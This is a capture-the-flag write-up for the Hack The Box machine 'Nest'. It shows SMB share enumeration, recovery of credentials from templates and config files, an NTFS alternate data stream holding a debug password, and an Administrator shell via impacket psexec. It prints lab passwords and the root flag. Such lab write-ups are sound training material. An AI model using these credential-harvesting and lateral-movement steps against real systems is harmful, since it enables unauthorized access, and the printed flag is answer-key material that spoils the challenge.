# NEST

Nest was a unique box in a way that involved no exploitation stages at all, it was purely a proccess of:
1.)enumerate
2.)get creds
3.)use creds

# USER

>nmap
```bash
Not shown: 999 filtered ports
PORT    STATE SERVICE       VERSION
445/tcp open  microsoft-ds?
4386/tcp open unknown

Host script results:
|_clock-skew: 2m52s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-06-12T13:25:42
|_  start_date: 2020-06-11T21:36:07
```
Nmap only shows 1 port open, 445 so we immediately think of smb.
```bash
kali@kali:~/boxes/nest$ smbclient -L nest.htb
Enter WORKGROUP\kali's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Data            Disk      
        IPC$            IPC       Remote IPC
        Secure$         Disk      
        Users           Disk      
SMB1 disabled -- no workgroup available
```
We try to access the data share without a password and we get in!
```bash
kali@kali:~/boxes/nest$ smbclient //nest.htb/Data
Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Aug  7 18:53:46 2019
  ..                                  D        0  Wed Aug  7 18:53:46 2019
  IT                                  D        0  Wed Aug  7 18:58:07 2019
  Production                          D        0  Mon Aug  5 17:53:38 2019
  Reports                             D        0  Mon Aug  5 17:53:44 2019
  Shared                              D        0  Wed Aug  7 15:07:51 2019

                10485247 blocks of size 4096. 6545907 blocks available

```
We enumerate the folders and find a file called `Welcome Email.txt` in `\Shared\Templates\HR\`, we transfer this to our box and theese are the contents:
```txt
We would like to extend a warm welcome to our newest member of staff, <FIRSTNAME> <SURNAME>

You will find your home folder in the following location: 
\\HTB-NEST\Users\<USERNAME>

If you have any issues accessing specific services or workstations, please inform the 
IT department and use the credentials below until all systems have been set up for you.

Username: TempUser
Password: welcome2019


Thank you
HR
```
We get the credentials for TempUser as TempUser:welcome2019

We enumerate some further and we find an xml file in `\IT\Configs\RU Scanner\`.
```xml
<?xml version="1.0"?>
<ConfigFile xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <Port>389</Port>
  <Username>c.smith</Username>
  <Password>fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=</Password>
</ConfigFile>
```
This password seems to be a hash of the user c.smith but we arent able to decrypt it.

We enumerate even further when we find a config.xml file in the `NotepadPlusPlus` directory. This is the important part of the file:
```xml
<File filename="\\HTB-NEST\Secure$\IT\Carl\Temp.txt" />
```
After enumerating the Secure$ share we find yet another file in RUScanner, this seems to be the algorithm that was used to hash c.smith's password, we open it in visual studio, we edit it to decrypt our hash by replacing part of the main fucntion with our hash and then we run it in the command prompt.

It brings back to us the decoded hash C.Smith:xRxRxPANCAK3SxRxRx

Now we can use smbclient to log back into the box and grap our user flag.
```bash
kali@kali:~/boxes/nest$ smbclient //nest.htb/Users -U C.Smith
Enter WORKGROUP\C.Smith's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jan 25 18:04:21 2020
  ..                                  D        0  Sat Jan 25 18:04:21 2020
  Administrator                       D        0  Fri Aug  9 11:08:23 2019
  C.Smith                             D        0  Sun Jan 26 02:21:44 2020
  L.Frost                             D        0  Thu Aug  8 13:03:01 2019
  R.Thompson                          D        0  Thu Aug  8 13:02:50 2019
  TempUser                            D        0  Wed Aug  7 18:55:56 2019

                10485247 blocks of size 4096. 6545907 blocks available
smb: \> cd C.Smith
smb: \C.Smith\> ls
  .                                   D        0  Sun Jan 26 02:21:44 2020
  ..                                  D        0  Sun Jan 26 02:21:44 2020
  HQK Reporting                       D        0  Thu Aug  8 19:06:17 2019
  user.txt                            A       32  Thu Aug  8 19:05:24 2019

                10485247 blocks of size 4096. 6545907 blocks available
smb: \C.Smith\> 
```
we simply transfer this file to our box and we read our user flag.

```bash
smb: \C.Smith\HQK Reporting\> ls
  .                                   D        0  Thu Aug  8 19:06:17 2019
  ..                                  D        0  Thu Aug  8 19:06:17 2019
  AD Integration Module               D        0  Fri Aug  9 08:18:42 2019
  Debug Mode Password.txt             A        0  Thu Aug  8 19:08:17 2019
  HQK_Config_Backup.xml               A      249  Thu Aug  8 19:09:05 2019

                10485247 blocks of size 4096. 6545907 blocks available
```
The file `Debug Mode Password.txt` seems to be empty but we run `allifo` on the file which proves that it is in fact not empty.
```bash
smb: \C.Smith\HQK Reporting\> allinfo "Debug Mode Password.txt"
altname: DEBUGM~1.TXT
create_time:    Thu Aug  8 07:06:12 PM 2019 EDT
access_time:    Thu Aug  8 07:06:12 PM 2019 EDT
write_time:     Thu Aug  8 07:08:17 PM 2019 EDT
change_time:    Thu Aug  8 07:08:17 PM 2019 EDT
attributes: A (20)
stream: [::$DATA], 0 bytes
stream: [:Password:$DATA], 15 bytes
```
So we can simply just read the file with 
```bash
more DEBUGM~1.TXT:Password:$DATA
```
This takes us into a nano session and gives us the password `WBQ201953D8w`

We take a look at port `4386` now using telnet, when we connect we can see that it is runnign the HQK reporting service that had files on the  smb shares.

We run help to check what command we can run in the limited shell:
```bash
>help

This service allows users to run queries against databases using the legacy HQK format

--- AVAILABLE COMMANDS ---

LIST
SETDIR <Directory_Name>
RUNQUERY <Query_ID>
DEBUG <Password>
HELP <Command>
```
We see that one of the options is debug mode with a password we try it out with the one we retrieved from the xml file earlier.
```bash
>DEBUG WBQ201953D8w

Debug mode enabled. Use the HELP command to view additional commands that are now available
>help

This service allows users to run queries against databases using the legacy HQK format

--- AVAILABLE COMMANDS ---

LIST
SETDIR <Directory_Name>
RUNQUERY <Query_ID>
DEBUG <Password>
HELP <Command>
SERVICE
SESSION
SHOWQUERY <Query_ID>
```
After enabling DEBUG we can see that a few extra commands have been enabled for us. We continue to enumerate.
```bash
>setdir ..

Current directory set to HQK
>list

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[DIR]  ALL QUERIES
[DIR]  LDAP
[DIR]  Logs
[1]   HqkSvc.exe
[2]   HqkSvc.InstallState
[3]   HQK_Config.xml

Current Directory: HQK
>setdir ldap

Current directory set to ldap
>list

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[1]   HqkLdap.exe
[2]   Ldap.conf

>showquery 2

Domain=nest.local
Port=389
BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local
User=Administrator
Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4
```
We use showquery to read our ldap.conf file and we get another password.

We then decompile the binary and add our password to the file with a ldap.conf and we run it and spits out our password. 
`XtH4nkS4Pl4y1nGX`

We can now login to the box as Administrator with that password and grap our root flag.

We use psexec.py from impacket and get a shell as Administrator.
```bash
ython3 psexec.py Administrator:XtH4nkS4Pl4y1nGX@10.10.10.178
Impacket v0.9.20-dev - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.10.178.....
[*] Found writable share ADMIN$
[*] Uploading file sgwNoHuY.exe
[*] Opening SVCManager on 10.10.10.178.....
[*] Creating service Cgkb on 10.10.10.178.....
[*] Starting service Cgkb.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>cd C:\Users\Administrator\Desktop
 
C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 2C6F-6A14

 Directory of C:\Users\Administrator\Desktop

01/26/2020  08:20 AM    <DIR>          .
01/26/2020  08:20 AM    <DIR>          ..
08/05/2019  11:27 PM                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  26,811,396,096 bytes free

C:\Users\Administrator\Desktop>type root.txt
6594c2eb084bc0f08a42f0b94b878c41
```
Thanks for reading hope you enjoyed.




